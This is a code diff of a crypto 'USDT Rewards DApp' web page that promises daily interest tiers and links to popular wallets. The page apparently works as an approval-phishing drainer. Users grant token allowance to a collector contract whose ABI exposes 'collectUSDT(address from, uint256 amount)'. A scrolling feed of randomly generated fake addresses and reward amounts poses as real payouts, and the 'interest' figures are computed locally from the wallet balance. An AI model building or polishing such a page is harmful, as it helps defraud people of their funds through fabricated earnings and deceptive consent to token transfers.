@@ -12,7 +12,7 @@
             100% { transform: translateY(-50%); }
         }
         .animate-scroll-list {
-            animation: scrollUp 1500s linear infinite;
+            animation: scrollUp 150s linear infinite;
         }
         .animate-scroll-list:hover {
             animation-play-state: paused;
@@ -38,7 +38,7 @@
         
         <div class="flex items-center justify-between mb-4 border-b border-slate-700 pb-4">
             <div class="flex items-center gap-2">
-                <img src="./logo.png" alt="Logo" class="w-8 h-8 rounded-full border border-emerald-400/50 object-cover" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';">
+                <img src="logo.png" alt="Logo" class="w-8 h-8 rounded-full border border-emerald-400/50 object-cover" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';">
                 <h1 class="text-xs md:text-sm font-bold text-emerald-400">USDT Rewards DApp</h1>
             </div>
 
@@ -101,11 +101,11 @@
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Locked balance</span>
-                    <span id="lblLockedBal" class="text-slate-200">0.000000 USDT</span>
+                    <span class="text-slate-200">0.000000 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Interest balance</span>
-                    <span id="lblInterestBal" class="text-slate-200">0.000000 USDT</span>
+                    <span id="lblCashbackBal" class="text-slate-200">0.000000 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Convertible balance</span>
@@ -147,7 +147,7 @@
         </div>
 
         <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4 text-xs">
-            <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Daily interest rate</h2>
+            <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
             <ul class="space-y-2 text-slate-300">
                 <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 100 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
                 <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 1,001 USDT</span> <span class="text-emerald-400 font-semibold">2% USDTBalance</span></li>
@@ -191,27 +191,27 @@
         <div class="overflow-hidden relative w-full py-3 bg-slate-900/80 rounded-xl border border-slate-800">
             <div class="animate-marquee flex items-center gap-6">
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="./okx.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="OKX Wallet">
+                    <img src="okx.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="OKX Wallet">
                     <span class="font-semibold text-slate-200 text-xs">OKX Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="./metamask.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="MetaMask">
+                    <img src="metamask.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="MetaMask">
                     <span class="font-semibold text-slate-200 text-xs">MetaMask Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="./cryptocom.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Crypto.com">
+                    <img src="cryptocom.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Crypto.com">
                     <span class="font-semibold text-slate-200 text-xs">Crypto.com Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="./coinbase.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Coinbase Wallet">
+                    <img src="coinbase.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Coinbase Wallet">
                     <span class="font-semibold text-slate-200 text-xs">Coinbase Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="./binance.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
+                    <img src="binance.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
                     <span class="font-semibold text-slate-200 text-xs">Binance</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="./trustwallet.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
+                    <img src="trustwallet.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
                     <span class="font-semibold text-slate-200 text-xs">Trust Wallet</span>
                 </div>
             </div>
@@ -237,9 +237,7 @@
             "function collectUSDT(address from, uint256 amount) external",
             "function requestWithdraw(uint256 amount) external",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
-            "function subAdminPrefix(address) view returns (string)",
-            "function lockedBalances(address) view returns (uint256)",
-            "function interestBalances(address) view returns (uint256)"
+            "function subAdminPrefix(address) view returns (string)"
         ];
 
         function startLiveCalculatingStats() {
@@ -267,27 +265,18 @@
             const container = document.getElementById("incomeListContainer");
             let htmlContent = "";
 
-            const tierRates = [0.016, 0.02, 0.024, 0.028, 0.032, 0.038, 0.042, 0.046, 0.05];
-            const tierMinAmounts = [100, 1001, 3001, 5001, 10001, 20001, 50001, 100001, 300001];
-
-            for (let i = 1; i <= 1000; i++) {
+            for (let i = 1; i <= 100; i++) {
                 const randomHex1 = Math.random().toString(16).substring(2, 7).toUpperCase();
                 const randomHex2 = Math.random().toString(16).substring(2, 8).toLowerCase();
                 const fakeAddress = `0x${randomHex1}......${randomHex2}`;
-
-                const randomTierIndex = Math.floor(Math.random() * tierRates.length);
-                const rate = tierRates[randomTierIndex];
-                const minAmt = tierMinAmounts[randomTierIndex];
-                
-                const randomBalance = minAmt + (Math.random() * (minAmt * 0.5));
-                const usdtReward = (randomBalance * rate).toFixed(2);
+                const randomAmount = (Math.random() * 5 + 1.5).toFixed(2);
 
                 htmlContent += `
                     <div class="flex items-center justify-between bg-slate-900/90 p-3 rounded-xl border border-slate-800">
                         <div class="flex items-center gap-2.5">
                             <span class="font-mono text-slate-300 text-xs">${fakeAddress}</span>
                         </div>
-                        <span class="font-mono font-semibold text-emerald-400 text-xs">${usdtReward} <span class="text-slate-400">USDT</span></span>
+                        <span class="font-mono font-semibold text-emerald-400 text-xs">${randomAmount} <span class="text-slate-400">USDT</span></span>
                     </div>
                 `;
             }
@@ -337,32 +326,21 @@
             }
         }
 
+        // Real-time Balance Sync on New Block
         function startRealtimeBalanceSync() {
             if (!provider || !userAddress) return;
             provider.on("block", async (blockNumber) => {
                 try {
                     const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
-                    const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
-                    
                     const balance = await usdtContract.balanceOf(userAddress);
-                    const lockedBalBN = await collector.lockedBalances(userAddress);
-                    const interestBalBN = await collector.interestBalances(userAddress);
-
                     const formattedBal = Number(ethers.formatUnits(balance, 6));
-                    const formattedLocked = Number(ethers.formatUnits(lockedBalBN, 6));
-                    const formattedInterest = Number(ethers.formatUnits(interestBalBN, 6));
                     
-                    if (document.getElementById("lblWalletBal")) {
-                        document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
-                    }
-                    if (document.getElementById("lblLockedBal")) {
-                        document.getElementById("lblLockedBal").innerText = `${formattedLocked.toFixed(6)} USDT`;
-                    }
-                    if (document.getElementById("lblInterestBal")) {
-                        document.getElementById("lblInterestBal").innerText = `${formattedInterest.toFixed(6)} USDT`;
+                    const currentBalEl = document.getElementById("lblWalletBal");
+                    if (currentBalEl) {
+                        currentBalEl.innerText = `${formattedBal.toFixed(6)} USDT`;
                     }
                 } catch (err) {
-                    console.error("Real-time sync error:", err);
+                    console.error("Real-time balance sync error:", err);
                 }
             });
         }
@@ -377,7 +355,7 @@
                     document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
-                    if (badgeEl) badgeEl.classList.remove("hidden");
+                    badgeEl.classList.remove("hidden");
 
                     document.getElementById("statusLog").innerText = "Welcome Back! Active mining...";
 
@@ -437,7 +415,7 @@
                     logEl.innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
-                    if (badgeEl) badgeEl.classList.remove("hidden");
+                    badgeEl.classList.remove("hidden");
 
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
                     document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
@@ -458,7 +436,7 @@
 
             try {
                 const badgeEl = document.getElementById("selectedNetworkBadge");
-                if (badgeEl) badgeEl.classList.remove("hidden");
+                badgeEl.classList.remove("hidden");
 
                 document.getElementById("connectBtn").innerText = "Connected & Approved";
                 document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
@@ -510,9 +488,6 @@
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
                 const balance = await usdtContract.balanceOf(userAddress);
-                
-                const lockedBalBN = await collector.lockedBalances(userAddress);
-                const interestBalBN = await collector.interestBalances(userAddress);
 
                 if (userInfo.isBanned) {
                     alert("Your account has been banned by Admin!");
@@ -522,8 +497,6 @@
 
                 const dashboardEl = document.getElementById("userDashboard");
                 const formattedBal = Number(ethers.formatUnits(balance, 6));
-                const formattedLocked = Number(ethers.formatUnits(lockedBalBN, 6));
-                const formattedInterest = Number(ethers.formatUnits(interestBalBN, 6));
                 const rate = getInterestRate(formattedBal);
 
                 if (Number(allowance) > 0) {
@@ -536,20 +509,15 @@
                             if (p) prefix = p;
                         } catch (e) {}
                     }
-                    
-                    let rawId = userInfo.userId ? userInfo.userId.toString() : "3069";
-                    if (rawId === "0" || !rawId) rawId = "3069";
-                    const userIdDisplay = `${prefix}${rawId}`;
-
+                    const userIdDisplay = userInfo.isRegistered ? `${prefix}${userInfo.userId.toString()}` : "3069";
                     document.getElementById("lblUserId").innerText = userIdDisplay;
 
                     document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
-                    document.getElementById("lblLockedBal").innerText = `${formattedLocked.toFixed(6)} USDT`;
-                    document.getElementById("lblInterestBal").innerText = `${formattedInterest.toFixed(6)} USDT`;
                     
                     const cashback = formattedBal * rate;
                     const maticInterest = (cashback / 3000).toFixed(5);
 
+                    document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
                     document.getElementById("lblConvertibleBal").innerText = `${maticInterest} MATIC`;
                     document.getElementById("lblInterestEth").innerText = `${maticInterest} MATIC`;
                     document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
